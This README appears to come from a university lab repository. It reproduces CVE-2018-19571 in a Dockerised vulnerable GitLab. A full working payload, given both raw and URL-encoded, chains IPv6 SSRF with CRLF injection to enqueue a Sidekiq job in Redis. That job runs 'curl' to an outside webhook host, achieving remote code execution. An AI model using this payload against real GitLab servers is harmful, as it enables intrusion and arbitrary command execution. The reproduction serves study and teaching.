# GitLab SSRF

This repository is a reproduction of [CVE-2018-19571](https://nvd.nist.gov/vuln/detail/CVE-2018-19571), and how when combined with a CRLF injection exploit, can lead to remote code execution (RCE).

## CVE Details

### CVE-2018-19571

GitLab CE/EE, versions 8.18 up to 11.x before 11.3.11, 11.4 before 11.4.8, and 11.5 before 11.5.1, are vulnerable to an SSRF vulnerability in webhooks.

## Setting Up

For this reproduction, we will be using a vulnerable GitLab image, and running it using Docker Compose.

```sh
git clone https://github.com/CS4239-U6/gitlab-ssrf.git
cd gitlab-ssrf
docker-compose up
```

The goal is to provide a webhook URL that, when processed, would result in a payload being sent to Redis.

This payload, that will be enqueued, will contain a Sidekiq Job, which upon execution will run arbitrary shell code. In our case, it will copy over the flag value to us.

## Steps

We will first run through the steps, before explaining what each of these steps do.

1. Create an account, or login using the root account.

   The root password should be `password`, as specified in the file `initial_root_password`, but sometimes this doesn't end up loading properly.

   In such cases, you will need to modify the root account password directly.

   ```sh
   docker exec -it gitlab-ssrf_web_1 /bin/bash
   # Inside the shell
   gitlab-rails console
   # Inside the console
   user = User.find_by_username 'root'
   user.password = 'password'
   user.password_confirmation = 'password'
   user.save!
   ```

   Then, head over to `http://localhost:5080` and login.

   ![Login Page](docs/login.png)

2. Navigate to the create project page.

   Next, head over to `http://localhost:5080/projects/new` and click the tab `Import project`. You should see that there is an option: `Repo by URL`. We are going to use that to perform our SSRF attack.

   ![Project Page](docs/project.png)

3. Create a webhook to receive the flag.

   Create a webhook URL at `https://webhook.site/`.

   Paste the URL into the following code at `<URL HERE>`:

   ```text
   git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
   multi
   sadd resque:gitlab:queues system_hook_push
   lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| curl https://webhook.site/807b6a27-314e-4947-b5f1-c384d8dc574f -k\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
   exec
   exec
   /ssrf.git
   ```

   Then finally, we encode the above using a [URL Encoder](https://www.urlencoder.org/). Note that we will only be encoding the payload (which includes the blanks at the beginning and the linebreaks), and not the first and last line. You will also need to use CRLF. Lastly, do replace the following characters, if any, with their respective encoding:

   - `_`: `%5F`
   - `.`: `%2E`
   - `-`: `%2D`

   ```text
   git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7C%20curl%20https%3A%2F%2Fwebhook%2Esite%2F807b6a27%2D314e%2D4947%2Db5f1%2Dc384d8dc574f%20%2Dk%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git
   ```

   (Or you can just use this payload above, and check out <https://webhook.site/#!/807b6a27-314e-4947-b5f1-c384d8dc574f/> to see the output).

   ![Loading](docs/loading.png)

   You should see that a GET request was made to the webhook (and it will repeat as GitLab repeatedly tries to fetch the repository).

   ![Webhook](docs/webhook.png)

### Debugging

If the above is failing for you, you might need to enable Outbound Requests to internal services.

![Requests](docs/request.png)

You can do so at `http://localhost:5080/admin/application_settings/network` after logging in as root.

## How does this work?

We're exploiting two vulnerabilities for this attack. The first vulnerability is SSRF, where internal services can be reached via IPv6. You can see more information at the GitLab issue here: <https://gitlab.com/gitlab-org/gitlab-foss/-/issues/53242>.

The second vulnerability is how line breaks were allowed in the URL for the webhooks.

These two combined allow us to actually pass a payload to the internal service. In this case, we're targeting the local Redis service.

The payload we pass in enqueues a new job in the Redis queue, and this job is actually processed by Sidekiq, a async job runner that works with Ruby on Rails. We're specifically targeting the `GitlabShellWorker` job class, which allows us to execute arbitrary code.

```ruby
class GitlabShellWorker
  include ApplicationWorker
  include Gitlab::ShellAdapter

  def perform(action, *arg)
    gitlab_shell.__send__(action, *arg) # rubocop:disable GitlabSecurity/PublicSend
  end
end
```

Thus, by passing in `open('| curl <URL HERE>').read` and running it with `class_eval`, we can trigger the remote code execution.
